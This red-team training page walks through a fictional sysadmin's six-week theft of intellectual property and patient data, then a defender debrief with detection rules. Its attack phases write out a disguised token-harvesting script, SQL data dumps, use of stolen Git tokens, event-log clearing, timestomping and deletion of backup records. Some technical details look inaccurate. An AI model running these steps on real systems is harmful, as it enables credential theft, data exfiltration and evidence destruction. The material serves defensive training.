---
layout: training-page
title: "Insider Threat Simulation — Red Team Academy"
module: "Scenarios"
tags:
  - insider-threat
  - ueba
  - dlp
  - data-theft
  - anti-forensics
  - sysadmin
  - casb
page_key: "scenarios-insider-threat"
render_with_liquid: false
---

# Malicious Insider Threat Simulation

## Scenario Overview

This scenario simulates a malicious insider threat: a disgruntled senior sysadmin at a healthcare technology company who has decided to leave the organization and take valuable intellectual property with them. Unlike external threat scenarios, the insider already has legitimate elevated access to most systems. The challenge is fundamentally different: there is no exploitation, no initial access phase, no lateral movement in the traditional sense. The attacker IS the trusted user.

The simulation covers how an insider with privileged access conducts systematic reconnaissance of high-value data, stages and exfiltrates that data using techniques that blend with normal administrative behavior, and takes anti-forensic steps before departure to limit the organization's ability to reconstruct what happened.

For defenders, this scenario highlights why perimeter security tools are nearly blind to the insider threat, and why UEBA (User and Entity Behavior Analytics), DLP (Data Loss Prevention), and CASB (Cloud Access Security Broker) are the primary detection technologies — and where they systematically fail.

**Timeline:** The scenario takes place over 6 weeks, beginning 6 weeks before the sysadmin's planned resignation date.

---

## Threat Actor Profile: The Malicious Insider

**Name:** David Kim (fictional)  
**Role:** Senior Systems Administrator  
**Tenure:** 7 years at MedTech Innovations  
**Access level:** Domain Admin equivalent, administrator on all production servers, access to backup systems and DR infrastructure, member of the IT-Admin group in SharePoint with read/write access to all IT and engineering documentation, local admin on all workstations via SCCM deployment  
**Technical skills:** Expert — holds MCSA, has scripted most of the company's automation, knows exactly where data is stored and which logs capture what  
**Motivation:** Passed over for promotion twice. Accepted an offer from a competitor. Plans to provide intellectual property to the new employer in exchange for a signing bonus.  
**Timeline awareness:** David knows the company will revoke his access the moment he resigns. He needs to complete all exfiltration BEFORE submitting resignation.

### What Makes the Insider Threat Different

| Attribute | External Attacker | Malicious Insider |
| --- | --- | --- |
| Initial access | Must be obtained | Already exists (legitimate) |
| Privilege escalation | Required | Unnecessary — already privileged |
| Lateral movement | Central challenge | Minimal — already has access |
| Detection challenge | Network traffic, exploitation artifacts | Must distinguish malicious use from legitimate use |
| Primary detection tools | IDS/IPS, AV, EDR | DLP, UEBA, CASB, behavioral analytics |
| Attacker advantage | Zero-days, evasion tools | Knows the defensive landscape intimately |

---

## Target Profile: MedTech Innovations

**Organization:** MedTech Innovations LLC (fictional)  
**Industry:** Healthcare technology — develops FDA-cleared medical device software and clinical analytics platforms  
**Headcount:** 450 employees across 2 offices  
**Crown jewels:** Source code for two FDA-cleared software products, clinical trial data, customer contracts and pricing, engineering roadmap documents, proprietary algorithms for diagnostic analytics  
**Regulatory environment:** HIPAA (handles PHI), FDA cybersecurity requirements for medical device software, SOC 2 Type II certification

### Technology Stack

| Layer | Technology |
| --- | --- |
| File Storage | SharePoint Online (M365), mapped network drives on Windows File Server (\\FILESERVER01) |
| Source Code | GitHub Enterprise (self-hosted on-prem), Azure DevOps for some projects |
| Databases | SQL Server 2019 (on-prem, production), PostgreSQL on AWS RDS (dev/test) |
| Backup | Veeam Backup & Replication, NAS (\\BACKUP01), offsite to Azure Blob |
| Endpoints | Windows 11 workstations, SCCM deployment, Microsoft Defender AV (no EDR) |
| Identity | Active Directory (on-prem), Azure AD Connect, M365 E3, MFA for cloud apps |
| Monitoring | Microsoft Sentinel (basic), Microsoft Purview (DLP policy — limited scope) |
| DLP | Microsoft Purview DLP (covers SharePoint Online + Exchange — NOT file server) |
| UEBA | Microsoft Sentinel UEBA (enabled but not fully tuned) |
| CASB | Defender for Cloud Apps (limited connectors — only M365, not personal cloud) |

### David's Known Access

David has been the primary sysadmin for 7 years. He knows every system intimately:
- Domain Admin credentials (knows the domain admin password — he set it up)
- Local admin on all workstations and servers
- Read/write access to the backup NAS and all backup jobs
- Access to the GitHub Enterprise admin console
- Access to SCCM — can deploy software to all endpoints
- Access to Veeam backup console — can restore any file, any version
- SSH keys for production Linux servers stored in his personal vault
- Can enumerate and read all Exchange Online mailboxes (Exchange admin)

---

## Phase 1 — Reconnaissance: What's Valuable and Where Does It Live?

**ATT&CK Tactic:** Discovery (TA0007)  
**Techniques:** Data from Local System (T1005), Network Share Discovery (T1135), Cloud Storage Object Discovery (T1619), File and Directory Discovery (T1083)

### Week 6 Before Resignation

David already knows the environment better than anyone. Phase 1 is not about discovery — it's about **systematic inventory**. David spends the first two weeks creating a mental (and documented) map of exactly what he wants and where to find it.

```powershell
# David is already a Domain Admin. He uses legitimate admin tools.
# All of these commands would appear in logs as normal sysadmin activity.

# Enumerate high-value SharePoint sites:
# (David uses his normal SharePoint admin browser session)
# Browse to: https://medtech.sharepoint.com/sites/engineering
# Identifies: /sites/engineering/Shared Documents/IP-Protected/
#   - Diagnostic Algorithm v4.2 (core IP)
#   - FDA 510k Submission Package (regulatory)
#   - Clinical Trial Dataset Q3-2024 (PHI + research)
# Browse to: https://medtech.sharepoint.com/sites/sales
# Identifies: /sites/sales/Shared Documents/Contracts/
#   - All customer contracts with pricing (competitive intelligence)

# Enumerate file server shares and content:
Get-SmbShare -CimSession FILESERVER01 | Select Name, Path, Description
# Find which shares contain source code mirrors and engineering docs
dir \\FILESERVER01\Engineering\SourceBackups\
# Result: Full source code ZIP archives for both FDA-cleared products

# Enumerate GitHub Enterprise repositories:
# (David has admin console access)
# Browse to: https://github.medtech.local/admin → All Organizations → All Repos
# Identifies highest-value repos:
#   medtech/diagnostics-core     — core diagnostic algorithm (private, 847 commits)
#   medtech/device-firmware      — embedded firmware (private, proprietary protocols)
#   medtech/clinical-api         — clinical data API (HIPAA-adjacent)

# Identify backup locations for data not easily accessible otherwise:
Get-VBRBackupJob | Select Name, TargetDir, ScheduleEnabled
# Result: Identifies backup schedule and storage locations
# \\BACKUP01\MSSQL-Backups\ — full SQL Server database backups (nightly)
# These backups contain ALL database data, bypassing row-level security on production

# Assess what DLP covers:
# David knows from administering Purview:
# DLP policies cover: SharePoint Online + Exchange Online only
# NOT covered: \\FILESERVER01 network shares (on-prem, not covered by Purview DLP)
# NOT covered: USB (no endpoint DLP configured on Defender)
# NOT covered: personal cloud uploads from browser (CASB only connected to M365 apps)
```

**Operational note:** David takes no notes. Everything he learns goes to memory or is written in a personal journal on his personal phone (not a company device). He never uses company email or Teams to discuss his plans.

---

## Phase 2 — Access Expansion: Obtaining Data Beyond His Normal Scope

**ATT&CK Tactic:** Privilege Escalation (TA0004), Credential Access (TA0006)  
**Techniques:** Valid Accounts (T1078), Credentials from Password Stores (T1555), Email Collection (T1114)

### Week 5-4 Before Resignation

David's existing access is extensive but not complete. Some data lives in SQL Server databases where application credentials (not admin credentials) control access. He needs to access these without triggering unusual login alerts.

```powershell
# Access SQL Server production databases using sysadmin access:
# David is a member of the local Administrators group on the SQL Server
# SQL Server with Windows auth: local admin → can impersonate sysadmin via DAC
# Connect using Dedicated Admin Connection (bypasses normal connection limits):
sqlcmd -S SQLPROD01 -A -Q "SELECT name FROM sys.databases"
# Lists all databases — now access each:

sqlcmd -S SQLPROD01 -A -Q "
SELECT patient_id, study_id, diagnostic_result, algorithm_version
FROM ClinicalTrials.dbo.StudyResults
WHERE study_status = 'ACTIVE'
" -o C:\Windows\Temp\syscheck_results.csv

# This generates a SQL Server login event (4625 type) under his domain admin credentials
# However, David regularly connects to SQL Server for patching — this looks normal

# Access Exchange Online mailboxes via eDiscovery (admin privilege):
# David uses M365 compliance center to run an eDiscovery export
# Target: CEO + CTO mailbox for the past 6 months
# Query: subject:("acquisition") OR subject:("valuation") OR subject:("competitor")
# This surfaces strategic communications — board-level IP
# Exchange admin access + eDiscovery is a legitimate tool David uses for legal holds

# Harvest GitHub access tokens from developer workstations:
# David pushes a new SCCM script deployment to developer workstations
# Script: "Scheduled maintenance — credential cache cleanup"
# Actual script content:
Get-ChildItem -Path "$env:USERPROFILE\.gitconfig" | Get-Content
Get-ChildItem -Path "$env:USERPROFILE\AppData\Roaming\GitHub*" -Recurse | 
  Where-Object {$_.Name -like "*.json" -or $_.Name -like "*token*"}
# Output is written to \\FILESERVER01\IT-Admin\maintenance\cred-check-{hostname}.txt
# David reads these files remotely — extracts GitHub personal access tokens
# These tokens can clone private repos from outside the corporate network
```

---

## Phase 3 — Data Staging: Collecting and Preparing for Exfiltration

**ATT&CK Tactic:** Collection (TA0009)  
**Techniques:** Archive Collected Data (T1560), Data Staged (T1074), Data from Network Shared Drive (T1039), Data from Cloud Storage (T1530)

### Week 3-2 Before Resignation

David doesn't copy data to his workstation in large batches — that would trigger UEBA volume anomaly alerts. Instead, he stages data gradually over two weeks, in amounts that stay within his normal daily file access baseline.

```powershell
# Staging strategy: Use the Veeam backup restore mechanism
# David regularly restores test files from backup (legitimate admin task)
# He uses this to create a "test restore" that is actually data staging

# Restore source code archives from backup to staging location:
# (This appears as a routine backup test in Veeam logs)
Start-VBRRestoreVM  # Or file-level restore via Veeam
# Restore to: \\FILESERVER01\IT-Admin\test-restore-20240115\
# Contents: source code ZIP files from 3 months ago

# Compress and encrypt collected data using 7-Zip (already installed for admin use):
# David uses IT-TOOLS share where he stores admin scripts — no DLP on this share
"C:\Program Files\7-Zip\7z.exe" a -tzip -p"PersonalKey!2024$" \
  "\\FILESERVER01\IT-Admin\encrypted-backup-test.zip" \
  "\\FILESERVER01\IT-Admin\test-restore-20240115\*"

# Stage SQL database backups:
# Copy the nightly SQL backup (already encrypted by SQL Server) to the IT-Admin share:
Copy-Item "\\BACKUP01\MSSQL-Backups\ClinicalTrials_full_20240115.bak" \
  "\\FILESERVER01\IT-Admin\db-verify-20240115.bak"
# This copy event generates a file copy log but IT admins copy backup files regularly

# Stage GitHub repo content via cloning:
# David uses his personal laptop (not corporate) at home to clone repos
# using the harvested GitHub tokens — corporate DLP never sees this traffic
git clone https://HARVESTED_TOKEN@github.medtech.local/medtech/diagnostics-core.git
git clone https://HARVESTED_TOKEN@github.medtech.local/medtech/device-firmware.git
# These clones appear in GitHub audit logs as valid authenticated operations
# by the token owners — not as David's account

# Volume management — stay below UEBA thresholds:
# David knows the UEBA baseline from administering Sentinel
# Normal daily file volume for IT admin: ~2-5 GB
# Keeps each day's staging under 3 GB to avoid triggering volume anomaly alerts
# Spreads staging activity across 10 business days
```

---

## Phase 4 — Exfiltration: Getting Data Out

**ATT&CK Tactic:** Exfiltration (TA0010)  
**Techniques:** Exfiltration to Cloud Storage (T1567.002), Exfiltration over Physical Medium (T1052.001), Exfiltration over Alternative Protocol (T1048), Scheduled Transfer (T1029)

### Week 2-1 Before Resignation

David has three exfiltration channels. He uses all three to ensure redundancy.

```bash
# Channel 1: Personal cloud storage via corporate browser — CASB evasion
# CASB (Defender for Cloud Apps) monitors: OneDrive for Business, SharePoint, Exchange
# NOT monitored by CASB: personal Dropbox, Google Drive (personal account), iCloud Drive
# David uses the browser to upload files to his personal Google Drive
# Technique: Use a personal Gmail account to sign into drive.google.com
# CASB has no connector for personal Google Drive → blind spot

# Upload the encrypted archive to personal Google Drive:
# David uses Chrome → google.com/drive → sign in with personal account → drag/drop upload
# Network log shows: HTTPS to drive.google.com (443) from David's workstation
# Palo Alto NGFW has SSL inspection disabled for Google domains (performance policy)
# → Encrypted upload content is invisible

# Channel 2: Physical — USB drive exfiltration
# MedTech has no USB DLP enabled in Microsoft Defender
# (USB restriction requires Defender for Endpoint P2 — they have Defender AV only)
# David brings a personal 256GB encrypted USB drive
# Copies staged files during off-hours (7pm, after most employees leave)
# Event logs capture file copy to removable media (Event ID 4663) IF object auditing
# is configured — at MedTech, object-level SACL auditing is not configured on the share

# Channel 3: Email via personal device (completely off corporate infrastructure)
# David uses his personal iPhone connected to personal mobile hotspot
# Logs into GitHub.medtech.local from OUTSIDE the corporate VPN
# Wait — GitHub is internet-accessible? Check from recon:
nmap -p 443 github.medtech.local  # During recon, confirmed externally accessible
# Yes — GitHub Enterprise is accessible from the internet (misconfiguration)
# David uses collected GitHub tokens to clone repos from home
# These accesses appear in GitHub audit log under the token owner's username

# Encrypted email to personal account using ProtonMail (encrypted at rest + in transit):
# David composes on personal phone — never touches corporate infrastructure
# Sends compressed/encrypted fragments of data to personal ProtonMail
# Each email is under 25MB (ProtonMail attachment limit) — sends 8 emails over 3 days
```

---

## Phase 5 — Covering Tracks: Anti-Forensics Before Departure

**ATT&CK Tactic:** Defense Evasion (TA0005)  
**Techniques:** Indicator Removal on Host (T1070), Clear Windows Event Logs (T1070.001), Timestomp (T1070.006), File Deletion (T1070.004), Modify Authentication Process (T1556)

### Week 1 Before Resignation

David knows that after he resigns, the company will conduct an investigation. He has a week to erase or confuse the forensic trail. His goal is not perfect erasure — that's impossible. His goal is raising the cost of investigation above the threshold where the company decides to pursue legal action.

```powershell
# Step 1: Clear Windows event logs on key systems:
# David targets the logs that would capture his staging activity
# Uses his domain admin credentials — log clearing is a legitimate admin operation

# Clear security logs on file server:
wevtutil cl Security /r:FILESERVER01
wevtutil cl System /r:FILESERVER01
wevtutil cl "Microsoft-Windows-SMBClient/Operational" /r:FILESERVER01

# Clear security logs on SQL Server:
wevtutil cl Security /r:SQLPROD01
wevtutil cl Application /r:SQLPROD01

# Clear logs on his own workstation:
wevtutil cl Security
wevtutil cl System
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# PROBLEM: Sentinel has already ingested these logs
# Log clearing only helps if Sentinel ingestion is delayed or partial
# MedTech's Sentinel is "basic" — spot-check David's knowledge:
# Sentinel data connector for Windows Security Events: configured on DCs + critical servers
# FILESERVER01 is NOT in the critical server list → security events NOT forwarded to Sentinel
# This means clearing FILESERVER01 security log actually destroys evidence permanently

# Step 2: Delete staged files from file server:
Remove-Item "\\FILESERVER01\IT-Admin\test-restore-20240115\" -Recurse -Force
Remove-Item "\\FILESERVER01\IT-Admin\encrypted-backup-test.zip" -Force
Remove-Item "\\FILESERVER01\IT-Admin\db-verify-20240115.bak" -Force
Remove-Item "\\FILESERVER01\IT-Admin\maintenance\" -Recurse -Force

# Step 3: Timestomping — modify file timestamps on remaining artifacts:
# PowerShell timestamp modification:
$file = Get-Item "C:\Windows\Temp\syscheck_results.csv"
$file.LastWriteTime = "01/01/2023 10:00:00"
$file.CreationTime  = "01/01/2023 09:00:00"
$file.LastAccessTime= "01/01/2023 10:00:00"
# NOTE: Timestomping does NOT modify the $MFT (Master File Table) $STANDARD_INFO
# vs $FILE_NAME entry discrepancy — forensic tools detect this.
# However, David doesn't know this nuance.

# Step 4: Delete Veeam restore job records:
# Veeam console → History → Restore → Delete job history for test restore operations
# Veeam stores job history in SQL database (VeeamBackup) — David can delete directly:
sqlcmd -S VEEAM-SQL -Q "
DELETE FROM [VeeamBackup].[dbo].[JobSessions]
WHERE job_name LIKE '%test-restore%'
AND creation_time > '2024-01-01'
"

# Step 5: Modify GitHub audit log retention (reduce window):
# GitHub Enterprise admin console → Audit log retention → Change from 90 days to 7 days
# This deletes 83 days of audit logs retroactively — including the token clone operations
# Note: This is detectable IF GitHub audit log is forwarded to SIEM in real-time
# At MedTech, GitHub audit logs are NOT forwarded to Sentinel

# Step 6: Create confusion artifacts:
# Create evidence that another employee was conducting similar searches:
# (David uses his Domain Admin account to add a script to a shared IT admin share
#  that, when accessed, creates file access events under another user's context)
# NOTE: This is a high-risk step — attribution manipulation creates additional crimes

# Step 7: Resign and ensure badge/system access is revoked quickly:
# Resigning on a Friday ensures the first investigation steps happen Monday
# Corporate response: IT access revoked same day (policy), device returned
# But forensic investigation won't start until Tuesday at earliest
# This gives 4 days where logs on local systems age off
```

---

## Phase 6 — What Happened After: The Investigation

When a departing employee's new employer begins demonstrating knowledge of MedTech's proprietary algorithms, MedTech's legal team initiates an investigation 3 months after David's departure.

```
# Forensic investigation — what evidence exists?

# Available evidence:
# 1. Microsoft Sentinel UEBA — David's accounts shows anomaly score increase during weeks 3-2
#    but alert threshold was set at 95th percentile — David's behavior reached 85th percentile
#    → Alert never fired

# 2. GitHub Enterprise audit log — only 7 days retained (David changed it)
#    → No evidence of clone operations

# 3. SharePoint Online audit log — retained 180 days (Microsoft retains this regardless)
#    → Shows David accessed the /sites/engineering IP documents 47 times in 3 weeks
#       (normal is 2-3 times per week for his role)
#    → This is the strongest forensic evidence

# 4. Exchange Online eDiscovery run — M365 audit log retained 90 days
#    → Shows David ran an eDiscovery export against CEO and CTO mailboxes
#    → Normal for legal holds — but no legal hold existed at the time
#    → Second-strongest evidence

# 5. FILESERVER01 event logs — cleared by David
#    → No evidence of file access or copy operations

# 6. Veeam job history — deleted by David
#    → No evidence of backup restore operations

# 7. Palo Alto NGFW logs — 30-day retention
#    → Investigation starts 90 days post-departure → logs aged off

# 8. USB events on David's workstation — device returned and reimaged per policy
#    → Physical evidence destroyed (standard offboarding)

# Conclusion: Evidence supports suspicious behavior but is insufficient for criminal prosecution.
# Company pursues civil litigation for breach of IP agreement instead.
# Lesson: Most insider threat cases result in civil action, not criminal conviction.
```

---

## Defender Debrief

### Systematic Detection Failures

This scenario illustrates why insider threat programs consistently underperform against sophisticated insiders. The detection failures are systemic, not accidental.

#### DLP Failure Analysis

```
Microsoft Purview DLP was deployed at MedTech. Why did it fail?

Coverage gaps:
1. DLP covered SharePoint Online + Exchange Online (cloud scope)
2. DLP did NOT cover: \\FILESERVER01 (on-prem, requires different connector)
3. DLP did NOT cover: endpoint USB (requires Defender for Endpoint P2, not included)
4. DLP did NOT cover: personal cloud uploads in browser (requires CASB connector for personal apps)

Policy gaps:
5. DLP policy for "source code" was scoped to SharePoint, not exported ZIP archives
6. No DLP policy for SQL backup (.bak) files — novel data type not covered
7. No DLP policy for "large archive exports" — just content inspection

Result: David's exfiltration paths were chosen to avoid every covered vector.
Lesson: DLP coverage maps must be maintained and validated regularly.
An attacker who administers your DLP knows exactly where the gaps are.
```

#### UEBA Failure Analysis

```
Microsoft Sentinel UEBA was enabled. It detected behavioral anomalies.
But the alert threshold was never triggered. Why?

UEBA scored David's behavior correctly:
- Anomalous file access volume: scored HIGH
- Off-hours activity: scored MEDIUM
- eDiscovery run with no associated legal hold: scored HIGH
- Combined anomaly score: 85th percentile

Alert threshold: 95th percentile
Why so high? Too many false positives when lower — IT admins are inherently noisy.
The UEBA threshold was raised after a week of alert fatigue during initial deployment.

Result: The correct detection fired, but was below the tuned threshold.
Lesson: UEBA thresholds for privileged users (IT admins) should be LOWER than for
regular users, because their anomalies carry higher risk even at lower confidence levels.
A 70th percentile anomaly for a DA is more concerning than a 95th percentile anomaly
for a regular user.
```

#### CASB Failure Analysis

```
Defender for Cloud Apps (CASB) was deployed with M365 connectors.
David used personal Google Drive for exfiltration. Why was CASB blind?

CASB was deployed in API mode (not inline/proxy mode).
API mode: CASB connects directly to cloud app APIs to monitor activity
         → Only works for apps where CASB has API access (M365, Salesforce, etc.)
         → Personal Google Drive has no API connector configured

Proxy mode would have helped:
If CASB was deployed as a forward proxy (through Defender for Cloud Apps proxy),
ALL cloud traffic would be inspected regardless of destination.
Personal Google Drive uploads would be visible as "unsanctioned app upload" events.

But MedTech deployed API mode only:
- No proxy certificate deployed on endpoints
- No conditional access policy routing through the proxy
- Network path: workstation → PA NGFW → internet (CASB has no visibility into this path)

Result: Personal cloud uploads completely invisible to CASB.
Lesson: API-mode CASB provides limited protection against personal cloud exfiltration.
Inline/proxy CASB (or dedicated SWG with CASB integration) is required.
```

### What Would Have Caught This Earlier

| Control | Requirement | Would Have Detected |
| --- | --- | --- |
| Real-time GitHub audit log export to SIEM | GitHub Enterprise → Sentinel connector | Token-based clone operations — strongest technical evidence |
| Endpoint DLP with USB block | Defender for Endpoint P2 | USB exfiltration channel |
| CASB in proxy/inline mode | Network routing change + cert deployment | Personal Google Drive uploads |
| On-prem file server DLP | Microsoft Purview Unified DLP or Varonis | File copy staging on FILESERVER01 |
| UEBA privileged user threshold adjustment | Sentinel UEBA policy change | Anomaly score would have exceeded threshold |
| Exchange admin activity alerting | Custom Sentinel rule | eDiscovery run without associated legal hold |
| Offboarding access revocation playbook | HR/IT process | Earlier revocation reduces window |

### Recommended Detection Rules

```
# Sentinel KQL — eDiscovery export without legal hold:
OfficeActivity
| where Operation == "SearchExported" or Operation == "SearchCreated"
| where UserId !contains "$" and UserId != "service-account@medtech.com"
| join kind=leftouter (
    OfficeActivity
    | where Operation == "HoldCreated"
    | summarize HoldCases=count() by UserId
  ) on UserId
| where isnull(HoldCases)
| project TimeGenerated, UserId, Operation, ResultCount=tostring(Parameters)
| where ResultCount > "0"

# Sentinel KQL — privileged user high-volume file access:
OfficeActivity
| where RecordType == "SharePointFileOperation"
| where UserId in (privileged_users_watchlist)
| summarize DailyFileOps=count() by bin(TimeGenerated, 1d), UserId
| where DailyFileOps > 3 * (
    OfficeActivity
    | where RecordType == "SharePointFileOperation"
    | summarize AvgDaily=avg(DailyCount) by UserId
    | project UserId, AvgDaily
  )

# Sentinel KQL — Windows event log clear on non-DC servers:
SecurityEvent
| where EventID == 1102  // Audit log cleared
| where Computer !in (domain_controllers_watchlist)
| project TimeGenerated, Computer, Account, Activity

# Sentinel KQL — SQL Server DAC connection (unusual admin connection type):
# Requires SQL Audit enabled and forwarded to Log Analytics
AzureDiagnostics
| where Category == "SQLSecurityAuditEvents"
| where action_name_s == "DATABASE AUDIT GROUP"
| where application_name_s contains "DAC"
| project TimeGenerated, server_instance_name_s, database_name_s, 
          server_principal_name_s, client_ip_s
```

### Insider Threat Program Recommendations

For defenders building an insider threat program, this scenario demonstrates the minimum required controls:

```
PEOPLE:
- Mandatory 2-person knowledge for crown jewel system access changes
- Separation of duties: sysadmin ≠ backup admin ≠ log admin (David had all three)
- Conduct access reviews quarterly for privileged accounts
- Monitor termination-risk indicators: missed promotions, HR escalations, resignation interview requests

PROCESS:
- Formal offboarding checklist with security validation before IT access is revoked
- Legal hold capabilities tested and known BEFORE an incident
- Data classification with enforcement — not all data should be accessible to all IT admins
- Document normal admin behavior patterns (what David "should" be doing daily)

TECHNOLOGY (minimum viable):
1. Real-time audit log export to SIEM (not relying on retained logs on endpoints)
2. Privileged user behavioral baseline + lower alert threshold for DA/EA accounts
3. CASB in proxy mode for cloud exfiltration visibility
4. Endpoint DLP with removable media policy
5. File server activity monitoring (Varonis or equivalent — on-prem Purview extension)
6. GitHub/source control audit log export to SIEM in real-time
```

---

## MITRE ATT&CK Summary

| Technique ID | Name | Phase Used |
| --- | --- | --- |
| T1135 | Network Share Discovery | Recon |
| T1083 | File and Directory Discovery | Recon |
| T1619 | Cloud Storage Object Discovery | Recon |
| T1005 | Data from Local System | Recon |
| T1078 | Valid Accounts | All Phases |
| T1555 | Credentials from Password Stores | Access Expansion |
| T1114.002 | Email Collection: Remote Email Collection | Access Expansion |
| T1530 | Data from Cloud Storage | Staging |
| T1039 | Data from Network Shared Drive | Staging |
| T1074.002 | Data Staged: Remote Data Staging | Staging |
| T1560.001 | Archive Collected Data: Archive via Utility | Staging |
| T1567.002 | Exfiltration to Cloud Storage | Exfiltration |
| T1052.001 | Exfiltration over Physical Medium: USB | Exfiltration |
| T1029 | Scheduled Transfer | Exfiltration |
| T1070.001 | Indicator Removal: Clear Windows Event Logs | Anti-Forensics |
| T1070.004 | Indicator Removal: File Deletion | Anti-Forensics |
| T1070.006 | Indicator Removal: Timestomp | Anti-Forensics |

## Key References

- `https://attack.mitre.org/tactics/TA0043/` — MITRE ATT&CK Reconnaissance tactic
- `https://www.cisa.gov/sites/default/files/publications/Insider_Threat_Mitigation_Guide_Final.pdf` — CISA Insider Threat Mitigation Guide
- `https://www.carnegiemellon.edu/cert/insider-threat/` — CERT Insider Threat Center research
- `https://docs.microsoft.com/en-us/microsoft-365/compliance/insider-risk-management` — Microsoft Purview Insider Risk Management
- `https://www.varonis.com/blog/insider-threat-statistics` — Insider threat statistics and case studies
- `https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries` — M365 Defender hunting queries
- *The CERT Guide to Insider Threats* by Dawn Cappelli, Andrew Moore, Randall Trzeciak — definitive reference
